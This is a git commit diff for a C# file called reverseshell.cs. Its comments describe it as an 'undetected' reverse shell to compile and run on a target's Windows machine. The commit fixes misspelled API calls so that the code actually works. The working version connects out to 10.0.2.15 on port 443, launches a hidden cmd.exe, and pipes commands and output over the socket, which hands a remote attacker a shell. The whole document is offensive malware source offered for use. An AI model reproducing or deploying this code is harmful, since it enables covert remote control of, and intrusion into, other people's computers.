20fb91d49ffc7ca833564a9d1f0996c7d97ef9f7
Do0pH2ck <44820142+doophack@users.noreply.github.com>
2019-08-25 03:03:16 +0100

    fixed silly Bugs :)

--- reverseshell.cs
+++ reverseshell.cs
@@ -3,59 +3,71 @@
 // Compile And Run On Target's Machine (Windows Machine)
 // Undetected ReverseShell Made In C#
 using System;
-using System.Net;
-using System.Net.Sockets;
-using System.Diagnostics;
 using System.Text;
 using System.IO;
+using System.Diagnostics;
 using System.ComponentModel;
 using System.Linq;
+using System.Net;
+using System.Net.Sockets;
 
-namespace ConnectBack {
-  public class Program {
-    static StreamWriter streamWriter;
-    public static void Main(string[] args) {
-      using (TcpClient client = new TcpClient("127.0.0.1",911)) {
-        using (Stream stream = client.GetStream())
+
+namespace ConnectBack
+{
+	public class Program
+	{
+		static StreamWriter streamWriter;
+
+		public static void Main(string[] args)
+		{
+			using(TcpClient client = new TcpClient("10.0.2.15", 443))
+			{
+				using(Stream stream = client.GetStream())
+				{
+					using(StreamReader rdr = new StreamReader(stream))
+					{
+						streamWriter = new StreamWriter(stream);
+						
+						StringBuilder strInput = new StringBuilder();
+
+						Process p = new Process();
+						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.CreateNoWindow = true;
+						p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.Start();
+						p.BeginOutputReadLine();
+
+						while(true)
+						{
+							strInput.Append(rdr.ReadLine());
+							//strInput.Append("\n");
+							p.StandardInput.WriteLine(strInput);
+							strInput.Remove(0, strInput.Length);
+						}
+					}
+				}
+			}
+		}
+
+		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
-          using(StreamReader rdr = new StreamReader(stream)) {
-            streamWriter = new StreamWriter(stream);
+            StringBuilder strOutput = new StringBuilder();
 
-            StringBuilder strInput = new  StringBuilder();
-
-
-            Process p = new Process();
-
-            p.StartInfo.FileName = "cmd.exe";
-            p.StartInfo.CreateNowWindow = true;
-            p.StartInfo.UseShellExecute = false;
-            p.StartInfo.redirectStandarOutput = true;
-            p.StartInfo.redirectStandarInput = true;
-            p.StartInfo.redirectStandarError = true;
-            p.OutputDataReceived += new OutputDataReceivedEvenHandler(CmdOutputDataHandler);
-            p.Start();
-            p.BeginOutputReadLine();
-
-            while(true) {
-              strInput.Append(rdr.ReadLine());
-              p.StandarInput.WriteLine(strInput);
-              strInput.Remove(0, strInput.Length);
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
             }
-          }
         }
-      }
-    }
-    public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEvenArgs outline) {
-      StringBuilder strOuput = new StringBuilder();
-      if (!String.IsNullOrEmpty(outLine.Data))
-      {
-        try {
-          strOuput.Append(outLine.Data);
-          streamWriter.WriteLine(strOuput);
-          streamWriter.FLush();
-        }
-        catch (Exception err) { }
-      }
-    }
-  }
+
+	}
 }
